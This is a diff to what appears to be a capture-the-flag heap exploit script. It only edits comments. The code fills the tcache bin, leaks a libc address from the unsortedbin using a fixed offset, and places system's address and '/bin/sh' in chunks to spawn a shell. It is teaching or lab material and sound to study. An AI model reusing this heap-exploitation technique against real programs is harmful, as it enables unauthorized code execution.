@@ -50,7 +50,7 @@ io = start()
 #                    EXPLOIT GOES HERE
 #============================================================
 
-# Fill the 0x90 tcache to get a 0x90 unsortedbin
+# Allocate all necessary chunks
 malloc(128, 0, b"A")
 malloc(128, 1, b"A")
 malloc(128, 2, b"A")
@@ -61,6 +61,8 @@ malloc(128, 6, b"A")
 malloc(128, 7, b"A")
 malloc(128, 8, b"A") # Guard against consolidation with the top chunk
 
+# Fill the tcache bin of size 0x90 to ensure the next 0x90 chunk allocation 
+# goes into the unsortedbin.
 free(0) # 0x90 tcache 1
 free(1) # 0x90 tcache 2
 free(2) # 0x90 tcache 3
@@ -70,18 +72,20 @@ free(5) # 0x90 tcache 6
 free(6) # 0x90 tcache 7
 free(7) # unsortedbin
 
-# Leak libc address from the unsortedbin
+# Leak the unsortedbin address which is in libc
 data = read(7)
 
-# Calculate libc address
+# Calculate libc address by substracting the leaked unsortedbin address
+# with its offset in libc
 libc.address = u64(data[:6] + b"\x00\x00") - 0x21ace0
 info("libc @ 0x%x", libc.address)
 
-# Call system(/bin/sh)
+# Setting up the parameters to call system(/bin/sh)
 system = hex(libc.sym.system)
 malloc(128, 0, f"{system}")
 malloc(128, 1, "/bin/sh\0")
 
+# Call system(/bin/sh) with the 42 program option
 call()
 
 #============================================================
